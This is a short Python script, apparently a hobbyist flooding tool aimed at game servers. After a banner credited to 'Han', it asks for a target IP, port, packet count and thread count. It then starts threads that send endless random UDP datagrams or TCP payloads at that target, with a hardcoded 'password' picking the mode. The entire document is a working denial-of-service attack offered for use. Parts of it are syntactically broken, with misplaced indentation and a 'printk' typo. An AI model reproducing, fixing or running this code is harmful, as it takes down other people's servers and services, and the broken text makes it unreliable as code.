import os
import random
import socket
import threading

os.system("clear")
print("|=====================================|")
print("|       WELCOME TO MY TOOLS           |")
print("|                                     |")
print("| Author        : Han		         |")
print("| YOUTUBE       : HAN SA:MP	         |")
print("| apa pun yang terjadi tidak di       |")             
print("| tanggung oleh Author                |")
print("|                                     |")
print("|=====================================|")
print("Subs Han SA:MP")
ip = str(input(" Ip :"))
port = int(input(" Port :"))
choice = str(input(" PASSWORD :"))
	times = int(input(" Packets :"))
	threads = int(input(" Threads :"))
	def run():
	data = random._urandom(20000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			printk" Sent packet to %s throught port:%s"%(ip,port))
		except:
			print("[!] Salah cmdnya bre!!!")

def run2():
	data = random._urandom(160)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(" Sent packet to %s throught port:%s"%(ip,port))
		except:
			s.close()
			print("[*] Salah cmdnya bre!!!")

for y in range(threads):
	if choice == 'han12':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()